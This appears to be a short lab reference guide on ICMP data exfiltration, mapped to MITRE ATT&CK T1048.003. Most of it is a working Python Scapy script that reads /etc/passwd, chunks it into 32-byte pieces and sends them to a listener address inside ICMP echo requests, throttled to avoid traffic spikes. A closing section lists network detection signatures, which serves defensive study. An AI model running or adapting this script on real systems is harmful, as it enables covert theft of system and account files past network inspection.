# ICMP Data Exfiltration - Attacker Reference Guide

This folder documents standard ICMP exfiltration parameters using network simulation tools against a designated private target (e.g., `192.168.56.20`).

## 1. Overview of ICMP Exfiltration
Data exfiltration over ICMP encodes data bytes directly into the optional data payload field of ICMP Echo Request packets. By systematically chunking a file and transmitting it payload-by-payload to an external IP address, data bypasses standard boundary inspections. This maps to **MITRE ATT&CK T1048.003 (Exfiltration Over Alternative Protocol)**.

## 2. Command Reference

### Theoretical Scapy Exfiltration script configuration
An attacker can utilize Python scripting (Scapy) to parse a sensitive file (e.g. `/etc/passwd`) and chunk it into consecutive ping packets:

```python
from scapy.all import *
import time

# Target IP (the machine acting as the listener/receiver)
target_ip = "192.168.56.20"

# Open the file to exfiltrate
with open("/etc/passwd", "rb") as f:
    data = f.read()

# Chunk the data into 32-byte segments
chunk_size = 32
for i in range(0, len(data), chunk_size):
    chunk = data[i:i+chunk_size]
    
    # Construct standard ICMP Echo Request containing the file chunk as data
    packet = IP(dst=target_ip) / ICMP(type=8, code=0) / chunk
    
    # Send the packet
    send(packet, verbose=0)
    
    # Add a small delay to avoid traffic spikes
    time.sleep(0.1)
```

## 3. Network Detection Signatures
* High rates of ICMP packets containing non-alphabetical or structured data payloads.
* File magic headers (e.g. `\x7fELF` or `PK\x03\x04` zip headers) appearing within the ICMP payload bytes (visible via Wireshark or IDS rule matches).
* Persistent outbound ICMP traffic to unknown or unrouted IP addresses.
